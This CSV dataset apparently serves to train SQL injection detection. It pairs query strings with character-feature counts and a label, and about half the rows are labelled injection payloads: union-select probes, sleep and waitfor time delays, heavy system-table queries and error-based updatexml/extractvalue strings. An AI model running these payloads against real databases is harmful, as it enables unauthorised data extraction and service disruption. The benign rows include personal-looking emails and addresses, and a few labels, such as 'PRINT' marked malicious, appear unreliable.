Query,single_comments,logical_operators,arithmetic_operators,drop,union,special_chars,equal,delimiter,dot,whitespaces,digits,alphabets,brackets,nulls,hexadecimal,commas,single_quotes,double_quotes,Label
"   SELECT past,shallow,giving,shot,entirely     (  (  control JOIN arrange ON been.main =  short.courage )   INNER JOIN stageON Orders.ought =  bottom.dozenID ) ",0,0,0,0,0,0,2,0,161,32,0,89,4,0,0,4,0,0,0
calle soria 154 2a,0,0,0,0,0,0,0,0,18,3,4,11,0,0,0,0,0,0,0
grigoriu matons,0,0,0,0,0,0,0,0,15,1,0,14,0,0,0,0,0,0,0
angilberto,0,0,0,0,0,0,0,0,10,0,0,10,0,0,0,0,0,0,0
DELETE FROM forty WHERE till = 'come',0,0,0,0,0,0,1,0,37,6,0,13,0,0,0,0,2,0,0
372,0,0,0,0,0,0,0,0,3,0,3,0,0,0,0,0,0,0,0
"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",0,0,1,0,1,0,0,0,68,8,36,14,1,0,0,7,0,0,1
baxley@italianmotorvillagesevilla.sh,0,0,0,0,0,1,0,0,36,0,0,34,0,0,0,0,0,0,0
9.32767E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
6i4t562e7a,0,0,0,0,0,0,0,0,10,0,6,4,0,0,0,0,0,0,0
mirabel,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
moharra jodra,0,0,0,0,0,0,0,0,13,1,0,12,0,0,0,0,0,0,0
"1'||  (  select 'scba' where 9079  =  9079 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,2,2,0,0,0,2,0,133,46,21,47,7,0,0,1,3,0,1
"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  5132  =  5132",0,2,0,0,0,0,2,0,199,53,20,111,6,0,0,6,0,0,1
"1%""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,4,2,0,0,1,1,0,135,56,16,36,12,0,0,1,0,1,1
SELECT street ( s )  FROM pupil SELECT concerned ( s ) ,0,0,0,0,0,0,0,0,55,13,0,22,4,0,0,0,0,0,0
"   SELECT grade, letter, caveFROM being WHERE arrange  IS NOT NULL",0,0,0,0,0,0,0,0,66,13,0,27,0,0,0,2,0,0,0
"  SELECT * FROM garage WHERE exactly IN  ( 'above', 'shut', 'becoming' )  ",0,0,0,0,0,0,0,0,74,16,0,30,2,0,0,2,6,0,0
SELECT complete ( s ) FROM type INNER JOIN,0,0,0,0,0,0,0,0,42,8,0,13,2,0,0,0,0,0,0
"1""  )   and sleep  (  5  )  #",0,1,0,0,0,0,0,0,29,14,2,8,3,0,0,0,0,1,1
"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",0,3,0,0,0,0,2,0,169,47,18,78,6,0,0,4,4,0,1
DELETE FROM please,0,0,0,0,0,0,0,0,18,2,0,6,0,0,0,0,0,0,0
SELECT base ( s )  FROM is UNION ALL,0,0,0,0,0,0,0,0,36,9,0,7,2,0,0,0,0,0,0
-7535  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,0,1,11,0,0,0,1,0,335,161,50,77,35,0,0,0,0,0,1
1%'   )    )    and 9198  =  9198--,1,1,2,0,0,1,1,0,35,16,9,3,2,0,0,0,1,0,1
"  SELECT feelID AS ID, sick AS flag FROM possible",0,0,0,0,0,0,0,0,49,10,0,20,0,0,0,1,0,0,0
m9gnificen5i5,0,0,0,0,0,0,0,0,13,0,3,10,0,0,0,0,0,0,0
"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,0,2,0,0,0,2,2,0,154,55,39,36,10,0,3,6,0,4,1
n2ga1,0,0,0,0,0,0,0,0,5,0,2,3,0,0,0,0,0,0,0
gueldos donohue,0,0,0,0,0,0,0,0,15,1,0,14,0,0,0,0,0,0,0
1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,3,2,0,0,0,2,0,138,39,23,58,4,0,0,0,5,0,1
WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE SupplierId  =  Suppliers.supplierId AND Price  =  22 ) ;,0,0,0,0,0,0,2,1,113,23,2,45,2,0,0,0,0,0,0
SELECT * FROM statement WHERE worker  BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,55,10,4,15,0,0,0,0,0,0,0
" select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1,0,2,0,1,2,1,0,70,16,2,33,0,0,0,1,3,0,1
SELECT * FROM strength ORDER BY difference,0,0,0,0,0,0,0,0,42,6,0,18,0,0,0,0,0,0,0
-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,0,2,11,0,0,0,2,0,373,184,58,80,38,0,0,0,0,0,1
SELECT * FROM dozen WHERE verb NOT LIKE 'clothing%',0,0,0,0,0,1,0,0,51,8,0,17,0,0,0,0,2,0,0
trevetha,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
-4323'   )    )    or 6968  =  1393,0,1,1,0,0,0,1,0,35,16,12,2,2,0,0,0,1,0,1
54011879j,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
SELECT COUNT ( sinkID ) FROM sudden,0,0,0,0,0,0,0,0,35,6,0,10,2,0,0,0,0,0,0
"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",0,2,0,0,0,0,1,0,52,18,9,18,2,0,0,0,0,4,1
SELECT * FROM making WHERE him  BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,49,10,4,9,0,0,0,0,0,0,0
1972,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
"INSERT INTO my ( beneath, clock, worth, cannot, how, bear )  VALUES  ( 'flame', 'knew'. save', 'opinion', 'smoke', 'satisfied', 'model' )  ",0,0,0,0,0,0,0,0,139,24,0,71,4,0,0,10,13,0,0
"  SELECT * FROM brain WHERE cloud NOT IN  ( 'hardly', 'function', 'excellent' )  ",0,0,0,0,0,0,0,0,81,17,0,33,2,0,0,2,6,0,0
magdalen1,0,0,0,0,0,0,0,0,9,0,1,8,0,0,0,0,0,0,0
SELECT * FROM jack,0,0,0,0,0,0,0,0,18,3,0,4,0,0,0,0,0,0,0
SELECT Count ( * )  AS lower,0,0,0,0,0,0,0,0,28,7,0,9,2,0,0,0,0,0,0
" SELECT * FROM lonely ORDER BY correctly, meal",0,0,0,0,0,0,0,0,46,8,0,19,0,0,0,1,0,0,0
"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,0,2,0,0,0,2,2,0,134,36,10,66,4,0,0,4,0,4,1
-9501'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'mndw'  =  'mndw,0,15,1,0,0,0,3,0,430,191,54,111,40,0,0,0,4,0,1
1' where 5458  =  5458 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,0,0,0,0,0,0,1,0,102,45,10,35,8,0,0,0,1,0,1
"1'||  (  select 'djoe' from dual where 8063  =  8063   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",0,7,0,0,0,0,2,0,394,164,43,127,34,2,0,4,4,0,1
"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",0,2,0,0,0,0,1,0,161,55,8,79,8,0,0,2,0,4,1
SELECT TOP 3 * FROM breathe SELECT * FROM of 3SELECT * FROM sweet,0,0,0,0,0,0,0,0,65,13,2,14,0,0,0,0,0,0,0
9.84215E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
gail,0,0,0,0,0,0,0,0,4,0,0,4,0,0,0,0,0,0,0
1%'   )    )     )   and 3916  =  6327--,1,1,2,0,0,1,1,0,40,20,9,3,3,0,0,0,1,0,1
SELECT AVG ( extra ) FROM plant SELECT SUM ( possible ) ,0,0,0,0,0,0,0,0,56,12,0,18,4,0,0,0,0,0,0
SELECT * FROM air WHERE practical NOT LIKE '[machine]%',0,0,0,0,0,1,0,0,55,8,0,19,2,0,0,0,2,0,0
"-8205' or elt  (  6581  =  3480,3480  )   and 'sosv'  =  'sosv",0,2,1,0,0,0,2,0,62,20,16,16,2,0,0,1,4,0,1
discoro,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
SELECT TOP 50 PERCENT * FROM floor SELECT * FROM sort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM snake,0,0,0,0,0,0,0,0,111,21,5,14,0,0,0,0,0,0,0
adalgisa,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
SELECT COUNT ( essential ) FROM jack,0,0,0,0,0,0,0,0,36,6,0,13,2,0,0,0,0,0,0
16727733v,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
6448,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,0,0,0,0,0,0,1,0,66,28,10,21,4,0,0,0,1,0,1
SELECT * FROM useful WHERE immediately = 'series'  AND City = 'problem',0,0,0,0,0,0,2,0,71,12,0,33,0,0,0,0,4,0,0
"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",0,4,1,0,0,0,2,0,174,67,18,63,10,0,0,0,4,4,1
"   SELECT satellites, listen, bottomFROM threw WHERE mighty  IS NOT NULL",0,0,0,0,0,0,0,0,72,13,0,33,0,0,0,2,0,0,0
SELECT third ( s FROM wool RIGHT JOIN,0,0,0,0,0,0,0,0,37,7,0,10,1,0,0,0,0,0,0
c/ grabador david roberts 154 1-h,0,0,1,0,0,0,0,0,33,5,4,22,0,0,0,0,0,0,0
1'   )    )    as dcen where 5852  =  5852 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,1,2,0,0,0,1,0,120,57,10,38,10,0,0,0,1,0,1
SELECT farther ( s FROM two RIGHT JOIN,0,0,0,0,0,0,0,0,38,7,0,11,1,0,0,0,0,0,0
" select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",1,0,2,0,1,0,2,0,98,23,4,63,0,0,0,1,0,0,1
"1""  )   where 3122  =  3122 and sleep  (  5  )  #",0,1,0,0,0,0,1,0,49,20,10,13,3,0,0,0,0,1,1
"INSERT INTO automobile ( cry, strange, cost, though, wise, original )  VALUES  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )  ",0,0,0,0,0,0,0,0,144,24,0,76,4,0,0,10,13,0,0
SELECT pine ( s )  FROM minerals SELECT library ( s ) ,0,0,0,0,0,0,0,0,54,13,0,21,4,0,0,0,0,0,0
8.88987E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
-2214'  )   union all select 8228#,0,0,1,0,1,0,0,0,34,8,8,14,1,0,0,0,1,0,1
h958013a,0,0,0,0,0,0,0,0,8,0,6,2,0,0,0,0,0,0,0
SELECT * FROM found WHERE ride BETWEEN '1996-07-01' AND '1996-07-31',0,0,4,0,0,0,0,0,68,9,16,9,0,0,0,0,4,0,0
48552,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",0,0,1,0,1,0,0,0,63,4,36,14,0,0,0,7,0,0,1
"1%'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,0,0,0,0,1,0,0,151,58,23,50,13,0,2,4,1,0,1
"-6720'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'enfe' like 'enfe",0,12,1,0,0,0,2,0,387,174,52,95,36,0,0,1,4,0,1
androlo,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
SELECT * FROM product WHERE NOT closely = 'lion'  AND NOT far = 'sink',0,0,0,0,0,0,2,0,70,14,0,25,0,0,0,0,4,0,0
SELECT week ( s )  FROM outside SELECT pot FROM during,0,0,0,0,0,0,0,0,54,11,0,21,2,0,0,0,0,0,0
16582,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
bevis,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
SELECT * FROM negative WHERE poor = 'third' LIMIT 3,0,0,0,0,0,0,1,0,51,9,1,17,0,0,0,0,2,0,0
"  SELECT pleaseID AS ID, wherever AS uncle FROM boat",0,0,0,0,0,0,0,0,52,10,0,23,0,0,0,1,0,0,0
select case when 6558  =  4327 then 1 else null end--,1,0,2,0,0,0,1,0,53,12,9,29,0,1,0,0,0,0,1
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1,0,2,0,1,1,1,0,77,23,3,40,2,0,0,1,0,0,1
luesia,0,0,0,0,0,0,0,0,6,0,0,6,0,0,0,0,0,0,0
SELECT * FROM hill WHERE    NOT beyond = 'great',0,0,0,0,0,0,1,0,48,11,0,15,0,0,0,0,2,0,0
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""imlq"" like ""imlq",0,2,0,0,0,0,0,0,124,63,2,42,12,0,0,0,0,4,1
-3044'  )   or 4999  =  3051#,0,1,1,0,0,0,1,0,29,10,12,2,1,0,0,0,1,0,1
1' and sleep  (  5  )  #,0,1,0,0,0,0,0,0,24,10,2,8,2,0,0,0,1,0,1
1' where 2389  =  2389 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,11,2,0,0,0,3,0,355,162,53,80,32,0,0,0,1,0,1
"1%' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",0,2,0,0,0,2,2,0,155,57,35,40,10,0,3,5,4,0,1
25727,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
"1'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,2,0,0,0,1,0,135,37,9,72,5,0,0,3,1,0,1
SELECT MIN ( evening )  AS future FROM primitive,0,0,0,0,0,0,0,0,48,9,0,22,2,0,0,0,0,0,0
"  SELECT Orders.strugglerID, Employees.brief, Employees.favorite FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.leafID ORDER BY Orders.grabbedID",0,0,0,0,0,0,1,0,164,18,0,92,0,0,0,2,0,0,0
SELECT * FROM dinner WHERE layers = 'ranch'  AND  ( stage = 'suit' OR useful = 'heart' ) ,0,0,0,0,0,0,3,0,89,20,0,37,2,0,0,0,6,0,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_number_of_preferred_partners' LIMIT 1,0,0,0,0,0,0,1,0,104,11,1,62,0,0,0,0,2,0,0
"-8661"" union all select 5731,5731--",1,0,3,0,1,0,0,0,35,4,12,14,0,0,0,1,0,1,1
SELECT stronger ( s )  FROM machine SELECT proud ( s ) ,0,0,0,0,0,0,0,0,55,13,0,22,4,0,0,0,0,0,0
waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,0,1,0,0,0,0,0,0,60,20,3,27,3,0,0,0,5,0,1
h46a00o,0,0,0,0,0,0,0,0,7,0,4,3,0,0,0,0,0,0,0
SELECT * FROM difficult WHERE sick LIKE '%serve%',0,0,0,0,0,2,0,0,49,7,0,18,0,0,0,0,2,0,0
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",0,2,0,0,0,0,2,0,194,83,39,44,16,0,3,6,4,0,1
SELECT above ( s FROM beauty RIGHT JOIN,0,0,0,0,0,0,0,0,39,7,0,12,1,0,0,0,0,0,0
"  SELECT oxygen AS along, fence AS [instead]  FROM food",0,0,0,0,0,0,0,0,55,11,0,27,2,0,0,1,0,0,0
1 where 7055  =  7055,0,0,0,0,0,0,1,0,21,6,9,5,0,0,0,0,0,0,1
" select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",1,2,2,0,0,0,2,0,59,20,4,26,0,0,0,0,0,2,1
1.16E+15,0,0,1,0,0,0,0,0,8,0,5,0,0,0,0,0,0,0,0
lev@ozlon.ke,0,0,0,0,0,1,0,0,12,0,0,10,0,0,0,0,0,0,0
SELECT TOP 3 * FROM kept SELECT * FROM stove 3SELECT * FROM blood,0,0,0,0,0,0,0,0,65,13,2,14,0,0,0,0,0,0,0
nobuo,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
SELECT * FROM progress ORDER BY court DESC,0,0,0,0,0,0,0,0,42,7,0,13,0,0,0,0,0,0,0
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,54,10,4,10,0,0,0,0,0,0,0
SELECT * FROM silver  WHERE date NOT LIKE '[probably]%',0,0,0,0,0,1,0,0,55,9,0,18,2,0,0,0,2,0,0
SELECT TOP 3 * FROM fruit WHERE met = 'religious' SELECT * FROM addition,0,0,0,0,0,0,1,0,72,13,1,25,0,0,0,0,2,0,0
"   SELECT fur, electric, person FROM felt WHERE president  IS NULL",0,0,0,0,0,0,0,0,66,13,0,30,0,0,0,2,0,0,0
SELECT * FROM powerful WHERE    NOT distant = 'observe',0,0,0,0,0,0,1,0,55,11,0,22,0,0,0,0,2,0,0
SELECT WEEKDAY ( CURDATE (   )  )  ;,0,0,0,0,0,0,0,1,36,11,0,0,4,0,0,0,0,0,0
24768,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
ronet_huebner@nikemujeres.bm,0,0,0,0,0,1,0,0,28,0,0,25,0,0,0,0,0,0,0
"1""  )   as advz where 5166  =  5166 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,2,0,0,0,2,0,125,47,21,42,7,0,0,1,0,1,1
"   SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2,    A.CityFROM Customers A, Customers BWHERE A.CustomerID <> B.CustomerID  AND A.City  =  B.City ",0,0,0,0,0,0,1,0,172,28,2,79,0,0,0,3,0,0,0
8328,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
emesh,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""%""  =  """,0,1,0,0,0,1,1,0,77,25,8,32,4,0,0,1,0,3,1
SELECT AVG ( shop ) FROM yes SELECT SUM ( front ) ,0,0,0,0,0,0,0,0,50,12,0,12,4,0,0,0,0,0,0
SELECT promised ( s )  FROM itself FULL OUTER JOIN,0,0,0,0,0,0,0,0,50,10,0,15,2,0,0,0,0,0,0
" SELECT column_name ( s )  FROM happened,getting",0,0,0,0,0,0,0,0,48,8,0,26,2,0,0,1,0,0,0
dasonmica,0,0,0,0,0,0,0,0,9,0,0,9,0,0,0,0,0,0,0
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr",0,7,0,0,0,0,2,0,288,128,27,83,28,2,0,4,4,0,1
ana,0,0,0,0,0,0,0,0,3,0,0,3,0,0,0,0,0,0,0
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'zcrh'  =  'zcrh",0,2,10,0,0,0,3,0,391,185,47,103,38,0,0,1,4,0,1
"  SELECT Orders.gamerID, Employees.offer, Employees.fast FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tookID ORDER BY Orders.definitionID",0,0,0,0,0,0,1,0,159,18,0,87,0,0,0,2,0,0,0
SELECT COUNT ( DISTINCT energy )  FROM second,0,0,0,0,0,0,0,0,45,8,0,12,2,0,0,0,0,0,0
"-9509  )   union all select 1193,1193,1193#",0,0,1,0,1,0,0,0,43,8,16,14,1,0,0,2,0,0,1
"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed",0,1,0,0,0,0,1,0,145,50,39,38,10,0,3,6,0,0,1
1%' and 6454  =  8348 and '%'  =  ',0,2,0,0,0,2,2,0,35,12,9,6,0,0,0,0,4,0,1
"1,  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",0,0,10,0,0,0,1,0,344,163,43,89,36,0,0,2,0,0,1
SELECT MIN ( contrast )  AS shirt FROM length,0,0,0,0,0,0,0,0,45,9,0,19,2,0,0,0,0,0,0
FROM  ( SELECT DISTINCT old FROM cook ) ,0,0,0,0,0,0,0,0,40,9,0,7,2,0,0,0,0,0,0
8.72E+15,0,0,1,0,0,0,0,0,8,0,5,0,0,0,0,0,0,0,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""ewsr"" like ""ewsr",0,1,0,0,0,0,0,0,128,51,10,50,10,0,0,1,2,3,1
"1   )    )     )   union all select null,null,null,null,null,null--",1,0,2,0,1,0,0,0,67,18,1,38,3,6,0,5,0,0,1
SELECT TOP 3 * FROM trail,0,0,0,0,0,0,0,0,25,5,1,5,0,0,0,0,0,0,0
SELECT * FROM court WHERE his = 'perhaps',0,0,0,0,0,0,1,0,41,7,0,15,0,0,0,0,2,0,0
1'   )    )    as qovd where 8865  =  8865 and   (  3020  =  3020  )  *6703--,1,1,2,0,0,0,2,0,77,32,21,14,4,0,0,0,1,0,1
"1%""   )    )    and make_set  (  9897  =  5557,5557  )   and    (    (   ""%""  =  """,0,2,0,0,0,2,2,0,82,40,13,13,6,0,0,1,0,4,1
PRINT,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,1
SELECT DISTINCT art FROM if,0,0,0,0,0,0,0,0,27,4,0,5,0,0,0,0,0,0,0
SELECT * FROM movement WHERE NOT pour = 'because'  AND NOT being = 'foreign',0,0,0,0,0,0,2,0,76,14,0,31,0,0,0,0,4,0,0
51285362p,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"c/ juan ramon jimenez, 135, 11d",0,0,0,0,0,0,0,0,31,5,5,18,0,0,0,2,0,0,0
"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,0,2,0,0,0,2,2,0,165,65,35,40,12,0,3,5,0,4,1
1%'   )    )    and 1651  =  9324 and    (    (   '%'  =  ',0,2,0,0,0,2,2,0,59,32,9,6,4,0,0,0,4,0,1
"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",0,2,11,0,0,0,2,0,363,172,50,88,36,0,0,0,0,4,1
24711,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'gpeo' like 'gpeo",0,1,0,0,0,0,0,0,115,20,5,75,2,0,0,4,3,0,1
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'miir' like 'miir",0,2,0,0,0,0,1,0,84,38,13,21,6,0,0,1,4,0,1
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_non_library_sync_1_process_lock' LIMIT 1,0,0,0,0,0,0,1,0,133,11,2,82,0,0,0,0,2,0,0
1 where 6434  =  6434,0,0,0,0,0,0,1,0,21,6,9,5,0,0,0,0,0,0,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'knbx' like 'knbx",0,4,0,0,0,0,0,0,160,61,10,63,13,0,0,1,3,0,1
SELECT * FROM country,0,0,0,0,0,0,0,0,21,3,0,7,0,0,0,0,0,0,0
"-7083 union all select 7705,7705,7705,7705,7705#",0,0,1,0,1,0,0,0,48,4,24,14,0,0,0,4,0,0,1
4560,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
"   SELECT various,worse,alone,complete,gray     (  (  onto JOIN hand ON lost.detail =  harbor.storm )   INNER JOIN famousON Orders.slept =  hide.fightID ) ",0,0,0,0,0,0,2,0,155,32,0,83,4,0,0,4,0,0,0
